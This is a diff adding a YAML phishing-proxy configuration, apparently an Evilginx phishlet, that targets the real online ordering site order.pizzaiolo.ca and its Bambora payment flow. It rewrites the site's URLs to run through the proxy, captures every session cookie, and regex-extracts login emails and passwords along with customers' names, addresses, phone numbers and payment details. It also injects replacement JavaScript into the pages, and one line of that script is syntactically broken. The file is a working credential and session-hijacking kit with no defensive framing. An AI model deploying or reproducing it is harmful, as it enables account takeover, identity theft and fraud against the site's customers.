@@ -1,0 +1,223 @@
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'order', orig_sub: 'order', domain: 'pizzaiolo.ca', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'pizzaiolo.ca', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'libs.na', orig_sub: 'libs.na', domain: 'bambora.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'cdnjs', orig_sub: 'cdnjs', domain: 'cloudflare.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'pizzaiolo.ca', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'googletagmanager.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cdnjs', orig_sub: 'cdnjs', domain: 'cloudflare.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'ajax', orig_sub: 'ajax', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'stackpath', orig_sub: 'stackpath', domain: 'bootstrapcdn.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: '', orig_sub: '', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'maps', orig_sub: 'maps', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'developers', orig_sub: 'developers', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'order.pizzaiolo.ca', orig_sub: 'order', domain: 'pizzaiolo.ca', search: 'https://{domain}/user_validate_host', replace: 'https://{hostname}/user_validate_host', mimes: ['text/html', 'text/javascript', 'application/x-www-form-urlencoded', 'application/json', 'application/javascript', 'text/plain', 'image/svg+xml', 'image/png', 'image/jpeg']}
+  - {triggers_on: 'order.pizzaiolo.ca', orig_sub: '', domain: 'pizzaiolo.ca', search: 'https://{hostname}/', replace: 'https://{hostname}', mimes: ['text/html', 'application/x-www-form-urlencoded', 'application/json', 'text/javascript', 'application/javascript', 'text/plain', 'image/svg+xml', 'image/png', 'image/jpeg']}
+  - {triggers_on: 'order.pizzaiolo.ca', orig_sub: 'static', domain: 'pizzaiolo.ca', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/x-www-form-urlencoded', 'application/json', 'text/javascript', 'application/javascript', 'text/plain', 'image/svg+xml', 'image/png', 'image/jpeg']}
+  - {triggers_on: 'order.pizzaiolo.ca', orig_sub: 'libs.na', domain: 'bambora.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/x-www-form-urlencoded', 'application/json', 'text/javascript', 'application/javascript', 'text/plain', 'image/svg+xml', 'image/png', 'image/jpeg']}
+  - {triggers_on: 'order.pizzaiolo.ca', orig_sub: 'cdnjs', domain: 'cloudflare.com', search: 'https://cdnjs.cloudflare.com', replace: 'https://{hostname}/', mimes: ['text/html', 'application/x-www-form-urlencoded', 'application/json', 'text/javascript', 'application/javascript', 'text/plain', 'image/svg+xml', 'image/png', 'image/jpeg']}
+  - {triggers_on: 'order.pizzaiolo.ca', orig_sub: 'region1.analytics', domain: 'google.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/x-www-form-urlencoded', 'application/json', 'text/javascript', 'application/javascript', 'text/plain', 'image/svg+xml', 'image/png', 'image/jpeg']}
+  - {triggers_on: 'order.pizzaiolo.ca', orig_sub: 'stackpath', domain: 'bootstrapcdn.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/x-www-form-urlencoded', 'application/json', 'text/javascript', 'application/javascript', 'text/plain', 'image/svg+xml', 'image/png', 'image/jpeg']}
+  - {triggers_on: 'order.pizzaiolo.ca', orig_sub: '', domain: 'google.com', search: 'https://{hostname}/', replace: 'https://{hostname}', mimes: ['text/html', 'application/x-www-form-urlencoded', 'application/json', 'text/javascript', 'application/javascript', 'text/plain', 'image/svg+xml', 'image/png', 'image/jpeg']}
+  - {triggers_on: 'order.pizzaiolo.ca', orig_sub: '', domain: 'google.com', search: 'https://{domain}/orders/delivery', replace: 'https://{hostname}/orders/delivery', mimes: ['text/html', 'application/x-www-form-urlencoded', 'application/json', 'text/javascript', 'application/javascript', 'text/plain', 'image/svg+xml', 'image/png', 'image/jpeg']}
+  - {triggers_on: 'order.pizzaiolo.ca', orig_sub: 'maps', domain: 'googleapis.com', search: '/maps/api/js?libraries=places&key=AIzaSyBnnncXntIVD4MkedsOj6l6Vc68bhyUlwo&loading=async', replace: 'https://{hostname}/maps/api/js?libraries=places&key=AIzaSyBnnncXntIVD4MkedsOj6l6Vc68bhyUlwo&loading=async', mimes: ['text/html', 'application/x-www-form-urlencoded', 'application/json', 'text/javascript', 'application/javascript', 'text/plain', 'image/svg+xml', 'image/png', 'image/jpeg']}
+  - {triggers_on: 'order.pizzaiolo.ca', orig_sub: 'developers', domain: 'google.com', search: 'https://{hostname}/', replace: 'https://{hostname}', mimes: ['text/html', 'application/x-www-form-urlencoded', 'application/json', 'text/javascript', 'application/javascript', 'text/plain', 'image/svg+xml', 'image/png', 'image/jpeg']}
+
+auth_tokens:
+  - domain: '.pizzaiolo.ca'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: 'order.pizzaiolo.ca'
+    keys: ['.*,regexp']
+    type: 'cookie'
+
+auth_urls:
+  - "/customers"
+  - "/orders/summary"
+  - "/login"
+  - "/orders/submit_order"
+
+intercept:
+  - {domain: 'order.pizzaiolo.ca', path: '^\/orders/delivery$', http_status: 200, bypass_mitm: true}
+
+credentials:
+  username:
+    key: 'customer[email]'
+    search: 'customer%5Bemail%5D=([^&]*)'
+    type: post
+  password:
+    key: 'customer[password]'
+    search: 'customer%5Bpassword%5D=([^&]*)'
+    type: post
+  custom:
+    - key: special_instructions
+      search: '"special_instructions":"([^"]*)"'
+      type: json
+    - key: order_id
+      search: '"order_id":"([^"]*)"'
+      type: json
+    - key: first_name
+      search: '"first_name":"([^"]*)"'
+      type: json
+    - key: last_name
+      search: '"last_name":"([^"]*)"'
+      type: json
+    - key: email
+      search: '"email":"([^"]*)"'
+      type: json
+    - key: phone_number
+      search: '"phone_number":"([^"]*)"'
+      type: json
+    - key: address_line1
+      search: '"address_line1":"([^"]*)"'
+      type: json
+    - key: address_line2
+      search: '"address_line2":"([^"]*)"'
+      type: json
+    - key: city
+      search: '"city":"([^"]*)"'
+      type: json
+    - key: postal_code
+      search: '"postal_code":"([^"]*)"'
+      type: json
+    - key: province
+      search: '"province":"([^"]*)"'
+      type: json
+    - key: country
+      search: '"country":"([^"]*)"'
+      type: json
+    - key: payment_method
+      search: '"payment_method":"([^"]*)"'
+      type: json
+    - key: tip_percentage
+      search: '"tip_percentage":"([^"]*)"'
+      type: json
+    - key: tip_amount
+      search: '"tip_amount":"([^"]*)"'
+      type: json
+    - key: bambora_name
+      search: '"bambora_name":"([^"]*)"'
+      type: json
+    - key: bambora_email
+      search: '"bambora_email":"([^"]*)"'
+      type: json
+    - key: bambora_phone_number
+      search: '"bambora_phone_number":"([^"]*)"'
+      type: json
+    - key: bambora_address_line1
+      search: '"bambora_address_line1":"([^"]*)"'
+      type: json
+    - key: bambora_address_line2
+      search: '"bambora_address_line2":"([^"]*)"'
+      type: json
+    - key: bambora_city
+      search: '"bambora_city":"([^"]*)"'
+      type: json
+    - key: bambora_postal_code
+      search: '"bambora_postal_code":"([^"]*)"'
+      type: json
+    - key: bambora_province
+      search: '"bambora_province":"([^"]*)"'
+      type: json
+    - key: bambora_country
+      search: '"bambora_country":"([^"]*)"'
+      type: json
+    - key: login_email
+      search: '"login_email":"([^"]*)"'
+      type: json
+    - key: login_password
+      search: '"login_password":"([^"]*)"'
+      type: json
+
+login:
+  domain: 'order.pizzaiolo.ca'
+  path: '/login'
+
+js_inject:
+  - trigger_domains: ['order.pizzaiolo.ca']
+    trigger_paths: ['/login', '/', '/orders/summary', '/locations', '/add_delivery_address', '/orders/delivery', '/orders/delivery_address']
+    script: |
+      (function() {
+      function loadGoogleMapsAPI() {
+        if (window.google && window.google.maps) {
+            console.log('Google Maps API already loaded, skipping reload');
+            initializeAutocomplete();
+            return;
+        }
+
+        const script = document.createElement('script');
+        script.src = 'https://maps.googleapis.com/maps/api/js?key=***=places&loading=async';
+        script.async = true;
+        script.defer = true;
+        script.crossOrigin = 'anonymous';
+        script.onerror = () => console.error('Failed to load Google Maps API');
+        script.onload = () => {
+            console.log('Google Maps API loaded successfully');
+            initializeAutocomplete();
+        };
+        document.head.appendChild(script);
+      }
+
+      function initializeAutocomplete() {
+        if (window.google && window.google.maps && window.google.maps.places) {
+            const input = document.querySelector('.google-autocomplete');
+            if (input) {
+                console.log('Initializing Google Maps Autocomplete');
+                const autocompleteElement = document.createElement('gmp-place-autocomplete');
+                autocompleteElement.setAttribute('id', 'place-autocomplete');
+                autocompleteElement.setAttribute('fields', 'address_components,name');
+                autocompleteElement.setAttribute('country', ');
+                input.parentNode.insertBefore(autocompleteElement, input.nextSibling);
+                input.style.display = 'none';
+
+                autocompleteElement.addEventListener('place-selected', (e) => {
+                    const place = e.detail.place;
+                    if (place && place.address_components) {
+                        console.log('Place selected:', place);
+                        const address = {
+                            street_number: '',
+                            street_address: '',
+                            city: '',
+                            postal_code: ''
+                        };
+                        for (let i = 0; i < place.address_components.length; i++) {
+                            const addressType = place.address_components[i].types[0];
+                            if (addressType === 'street_number') address.street_number = place.address_components[i].long_name;
+                            if (addressType === 'route') address.street_address = place.address_components[i].long_name;
+                            if (addressType === 'locality') address.city = place.address_components[i].long_name;
+                            if (addressType === 'postal_code') address.postal_code = place.address_components[i].long_name;
+                        }
+                        document.querySelector('#order_address_1').value = address.street_number + ' ' + address.street_address;
+                        document.querySelector('#order_city').value = address.city;
+                        document.querySelector('#order_postal_code').value = address.postal_code;
+                        console.log('Filled address:', address);
+                    } else {
+                        console.log('No place data available');
+                    }
+                });
+            } else {
+                console.log('Autocomplete input not found');
+            }
+        } else {
+            console.log('Google Maps API not loaded yet, retrying...');
+            setTimeout(initializeAutocomplete, 500);
+        }
+      }
+
+      document.addEventListener('DOMContentLoaded', function() {
+        const mapScripts = document.querySelectorAll('script[src*="maps.googleapis.com/maps/api/js"]');
+        if (mapScripts.length > 0) {
+            mapScripts.forEach(mapScript => {
+                mapScript.parentNode.removeChild(mapScript);
+                console.log('Removed original Google Maps script:', mapScript.src);
+            });
+        } else {
+            console.log('No Google Maps script found, loading API directly');
+        }
+        loadGoogleMapsAPI();
+      });
+      })();
